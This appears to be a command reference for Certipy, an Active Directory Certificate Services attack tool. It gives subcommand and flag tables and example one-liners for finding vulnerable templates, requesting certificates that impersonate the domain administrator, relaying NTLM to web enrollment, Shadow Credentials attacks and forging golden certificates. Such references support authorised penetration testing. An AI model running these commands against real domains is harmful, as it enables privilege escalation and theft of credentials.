# Certipy Command Reference

Package: `certipy-ad` (binary: `certipy`). Source: https://github.com/ly4k/Certipy/wiki

## Subcommands

| Subcommand | Purpose |
|------------|---------|
| `certipy find` | Enumerate CAs, templates, and enrollment endpoints; flag ESC vulnerabilities |
| `certipy req` | Request (or forge via SAN) a certificate from a template |
| `certipy auth` | Authenticate with a PFX via PKINIT/Schannel; recover TGT + NT hash |
| `certipy relay` | Relay coerced NTLM into AD CS HTTP/RPC web enrollment (ESC8/ESC11) |
| `certipy shadow` | Shadow Credentials attack on `msDS-KeyCredentialLink` |
| `certipy ca` | Manage/backup the CA, enable templates, manage officers |
| `certipy template` | Read/modify certificate template configuration (ESC4) |
| `certipy forge` | Forge a Golden Certificate from a stolen CA key |
| `certipy account` | Create/modify/query machine and user accounts |
| `certipy cert` | Manipulate PFX/PEM certificate files (convert, extract) |

## Common Authentication Flags

| Flag | Meaning |
|------|---------|
| `-u USER@DOMAIN` | Username (UPN form) |
| `-p PASSWORD` | Cleartext password |
| `-hashes [LM]:NT` | Pass-the-hash authentication |
| `-k` / `-no-pass` | Use Kerberos ccache (KRB5CCNAME) |
| `-dc-ip IP` | Domain Controller IP |
| `-ns IP` / `-dns-tcp` | DNS resolver / use TCP for DNS |
| `-target HOST` | Target CA/host FQDN |
| `-debug` | Verbose output |

## `certipy find` Flags

| Flag | Meaning |
|------|---------|
| `-vulnerable` | Show only templates/CAs Certipy deems vulnerable |
| `-enabled` | Only enabled templates |
| `-hide-admins` | Hide built-in admin ACEs in output |
| `-stdout` | Print report to stdout |
| `-text` | Write a text report file |
| `-json` / `-bloodhound` | Output JSON / BloodHound-ingestible data |

## `certipy req` Flags

| Flag | Meaning |
|------|---------|
| `-ca NAME` | Target Certificate Authority name |
| `-template NAME` | Certificate template to enroll in |
| `-upn UPN` | SAN UserPrincipalName to impersonate (ESC1) |
| `-dns NAME` | SAN dNSName to impersonate |
| `-sid SID` | Embed objectSid (strong mapping) |
| `-pfx FILE` | Output PFX path |
| `-application-policies OID` | ESC15 application policy abuse |

## `certipy relay` Flags (ESC8/ESC11)

| Flag | Meaning |
|------|---------|
| `-target http://CA` | HTTP web enrollment target (ESC8) |
| `-target rpc://CA` | RPC ICertPassage target (ESC11) |
| `-template NAME` | Template to request (e.g. `DomainController`, `User`) |
| `-ca NAME` | CA name when relaying |

## `certipy shadow` Flags

| Flag | Meaning |
|------|---------|
| `shadow auto` | Add KeyCredential, auth, dump hash, restore — end to end |
| `shadow add/list/clear/info` | Granular KeyCredential operations |
| `-account NAME` | Target account (`victim`, `dc$`) |

## Example One-Liners

```bash
certipy find -u u@corp.local -p 'pw' -dc-ip 10.0.0.100 -vulnerable -stdout
certipy req -u u@corp.local -p 'pw' -ca CORP-CA -template VulnTpl -upn administrator@corp.local -sid S-1-5-21-...-500
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.100
certipy relay -target http://CA.CORP.LOCAL -template DomainController
certipy shadow auto -u u@corp.local -p 'pw' -dc-ip 10.0.0.100 -account victim-dc$
certipy forge -ca-pfx CORP-CA.pfx -upn administrator@corp.local
```
